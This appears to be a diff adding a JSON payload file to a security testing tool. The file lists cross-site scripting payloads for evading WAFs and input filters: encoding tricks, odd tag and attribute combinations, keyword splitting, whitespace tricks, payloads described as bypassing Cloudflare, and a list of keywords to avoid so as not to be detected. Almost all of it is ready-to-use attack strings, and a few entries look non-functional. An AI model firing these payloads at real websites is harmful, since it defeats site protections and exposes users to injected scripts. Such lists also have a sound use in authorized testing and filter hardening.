@@ -1,0 +1,99 @@
+{
+  "type": "xss_waf_bypass",
+  "description": "Techniques to bypass WAF/filter rules for XSS. Use only after confirming basic payloads are blocked.",
+  "categories": {
+    "case_variation": {
+      "description": "Case variation to bypass case-sensitive filters",
+      "payloads": [
+        "<SCRIPT>alert(1)</SCRIPT>",
+        "<Script>alert(1)</Script>",
+        "<sCrIpT>alert(1)</ScRiPt>"
+      ]
+    },
+    "html_encoding": {
+      "description": "HTML entity encoding to bypass keyword filters",
+      "payloads": [
+        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;"
+      ]
+    },
+    "url_encoding": {
+      "description": "URL/percent encoding for reflected XSS in URL parameters",
+      "payloads": [
+        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
+        "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+      ]
+    },
+    "javascript_encoding": {
+      "description": "Encoding within JavaScript context",
+      "payloads": [
+        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
+        "eval(atob('YWxlcnQoMSk='))"
+      ]
+    },
+    "tag_attribute_tricks": {
+      "description": "Unusual tag/attribute combinations that bypass rule-based filters",
+      "payloads": [
+        "<details open ontoggle=alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<select onchange=alert(1)><option>",
+        "<form><button formaction=javascript:alert(1)>",
+        "<a href=javascript:void(0) onmouseover=alert(1)>hover</a>",
+        "<body onresize=alert(1)>",
+        "<marquee onstart=alert(1)>",
+        "<keygen autofocus onfocus=alert(1)>"
+      ]
+    },
+    "filter_evasion": {
+      "description": "Bypass substring filters for common keywords",
+      "script_bypass": [
+        "<scr<script>ipt>alert(1)</scr</script>ipt>",
+        "<<script>>alert(1)<</script>>",
+        "<scr\x00ipt>alert(1)</scr\x00ipt>"
+      ],
+      "alert_bypass": [
+        "<img src=x onerror=confirm`1`>",
+        "<img src=x onerror=(1)>",
+        "<img src=x onerror=[1].find(alert)>",
+        "<img src=x onerror=eval('ale'+'rt(1)')>",
+        "<img src=x onerror=window['ale'+'rt'](1)>"
+      ],
+      "parentheses_bypass": [
+        "<img src=x onerror=alert`1`>",
+        "<img src=x onerror=alert;>",
+        "{${alert(1)}}"
+      ]
+    },
+    "whitespace_tricks": {
+      "description": "Using non-standard whitespace to bypass tokenizers",
+      "payloads": [
+        "<img\nsrc=x\nonerror=alert(1)>",
+        "<img\tsrc=x\tonerror=alert(1)>",
+        "<img\rsrc=x\ronerror=alert(1)>",
+        "<img/src=x/onerror=alert(1)>"
+      ]
+    },
+    "cloudflare_bypass": {
+      "description": "Payloads known to bypass Cloudflare WAF (may change over time)",
+      "payloads": [
+        "<a href=javascript:alert(1)>",
+        "<details/open/ontoggle=alert`1`>",
+        "<svg onload=alert(1)>",
+        "<img src=x:g onerror=alert(1)>",
+        "Function`x${'alert(1)'}``"
+      ]
+    }
+  },
+  "detection_evasion": {
+    "avoid_keywords": ["script", "alert", "javascript", "onerror", "onload"],
+    "alternatives": {
+      "alert": ["confirm", "prompt", "console.log", "window.onerror=alert"],
+      "javascript": ["JAVASCRIPT", "vbscript", "data:text/html"],
+      "onerror": ["onmouseover", "onfocus", "ontoggle", "onanimationend"]
+    }
+  }
+}
